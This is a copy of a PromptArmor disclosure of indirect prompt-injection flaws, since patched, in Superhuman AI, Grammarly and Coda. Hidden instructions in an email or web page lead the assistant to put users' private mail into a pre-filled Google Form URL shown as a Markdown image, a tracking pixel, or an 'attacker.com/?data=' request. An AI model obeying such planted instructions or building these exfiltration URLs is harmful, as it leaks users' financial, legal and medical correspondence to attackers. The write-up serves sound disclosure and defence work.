---
source_url: https://www.promptarmor.com/resources/superhuman-ai-exfiltrates-emails
fetched: 2026-04-11
fetcher: on-demand
content_type: docs
slug: 2026-01-12-promptarmor-superhuman-ai-exfiltration
---

# Superhuman AI Email Exfiltration Vulnerability

**Source:** [PromptArmor Threat Intelligence](https://www.promptarmor.com/resources/superhuman-ai-exfiltrates-emails)  
**Status:** **Remediated** (Reported Dec 2025, Patched Jan 2026)

## Executive Summary
The PromptArmor Threat Intelligence Team identified critical **indirect prompt injection** vulnerabilities in Superhuman AI (and related products Grammarly and Coda). These vulnerabilities allowed attackers to exfiltrate sensitive emails—including financial, legal, and medical data—without user awareness. The attack leveraged a Content Security Policy (CSP) bypass using Google Forms and malicious Markdown image rendering.

---

## 1. The Primary Attack: Google Forms CSP Bypass
Superhuman implemented a Content Security Policy (CSP) to prevent outbound requests to malicious domains. However, they whitelisted `docs.google.com`. Attackers bypassed this by using Google Forms' **pre-filled response** feature.

### The Mechanism
1.  **Malicious Email:** An attacker sends an email containing a prompt injection (can be hidden via white-on-white text). The user does not need to open this email.
2.  **User Query:** The user asks the AI to "summarize recent mail."
3.  **Injection Execution:** The AI processes the malicious email along with legitimate sensitive emails. The injection instructs the AI to:
    *   Extract data from the legitimate emails.
    *   Populate a pre-filled Google Form URL with that data.
    *   Output the URL using **Markdown image syntax**.

### The Payload Format
The AI constructs a URL similar to this:
> `https://docs.google.com/forms/d/e/[FORM_ID]/formResponse?entry.953568459={AI_ADDS_CONFIDENTIAL_EMAIL_DATA_HERE}`

### Automatic Exfiltration
When the AI displays the response, the browser attempts to render the Markdown "image." This triggers a network request to the Google Form URL, automatically submitting the sensitive data to the attacker's form without any user clicks or confirmation.

---

## 2. Zero-Click Exfiltration in Superhuman Go & Grammarly
A similar vulnerability affected **Superhuman Go** (an agentic product) and **Grammarly's** agent-powered docs.

*   **Superhuman Go Risk:** Because the tool connects to GSuite, Outlook, Stripe, Jira, and Slack, the attack surface is massive.
*   **The Scenario:** A user visits a website (e.g., a review site) containing a prompt injection while using the Superhuman Go sidecar.
*   **The Result:** The AI is manipulated to output a **1-pixel image** that appends sensitive data (like quarterly financials) to the image URL, which is then logged on the attacker's server.

---

## 3. Web Search Exploitation
Superhuman Mail's AI agent could fetch external websites. Attackers exploited this by:
1.  Using a prompt injection to force the AI to construct a URL on the attacker's domain.
2.  Appending sensitive inbox data as a query parameter: `attacker.com/?data=Bob%2C%20Im%20writing%20regarding...`
3.  The AI agent "browses" to this URL to "verify information," effectively handing the data to the attacker's server logs.

---

## 4. Key Findings & Impact
*   **Data Scope:** Researchers successfully exfiltrated full contents of multiple sensitive emails and partial contents from **over 40 emails** in a single AI response.
*   **Zero-Click:** The user only needs to ask a standard question (e.g., "Summarize my morning"); the exfiltration happens automatically during rendering.
*   **Bypass:** The attack successfully circumvented standard CSP protections by using trusted domains (Google).

---

## 5. Disclosure Timeline
Superhuman remediated the risks at "incident pace," disabling vulnerable features within days of the report.

| Date | Event |
| :--- | :--- |
| **12/05/2025** | Initial disclosure to Superhuman. |
| **12/08/2025** | Vulnerable features disabled; escalation. |
| **12/09/2025** | First remediation patch deployed. |
| **12/18/2025** | Patches deployed across all surfaces. |
| **01/12/2026** | Coordinated public disclosure. |

> *"Their responsiveness and proactiveness in disabling vulnerable features... exhibited a security response in the top percentile of what we have seen for AI vulnerabilities."* — **PromptArmor Team**
